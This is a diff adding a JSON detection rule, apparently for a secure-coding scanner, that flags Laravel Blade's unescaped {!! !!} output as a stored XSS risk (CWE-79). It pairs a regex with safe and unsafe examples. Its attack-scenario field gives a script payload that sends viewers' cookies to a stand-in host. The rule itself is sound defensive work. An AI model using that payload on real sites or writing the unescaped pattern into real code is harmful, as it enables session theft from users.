@@ -1,0 +1,33 @@
+{
+  "cwe_id": "CWE-79",
+  "name": "Laravel Blade Unescaped Output",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "blade",
+    "view",
+    "template",
+    "html",
+    "comment",
+    "bio",
+    "render",
+    "unescaped",
+    "markdown",
+    "profile"
+  ],
+  "patterns": [
+    {
+      "lang": "php",
+      "confidence": "high",
+      "re": "\\{!!.*\\$.*!!\\}",
+      "reject_re": "csrf_field|method_field|->links\\(|->render\\(|__\\(|trans\\(|Html::|Form::"
+    }
+  ],
+  "attack_scenario": "Attacker stores comment body = <script>fetch('//evil/'+document.cookie)</script>; {!! !!} renders it unescaped and the script runs for every viewer.",
+  "negative_test_hint": ["store a comment body of \"<script>alert(1)</script>\" and assert the rendered page escapes it as text rather than running the script"],
+  "exemplar": {
+    "noncompliant": "{!! $comment->body !!}",
+    "compliant": "{{ $comment->body }}",
+    "explanation": "Blade's {!! !!} prints its expression without HTML-escaping (unlike {{ }} which escapes via e()); feeding user-controlled data through it injects live markup. The reject_re excludes the common safe helpers (csrf_field, method_field, paginator->links, Html::/Form::, translation helpers). Use {{ }} for untrusted values, and only use {!! !!} for output you have sanitized."
+  }
+}
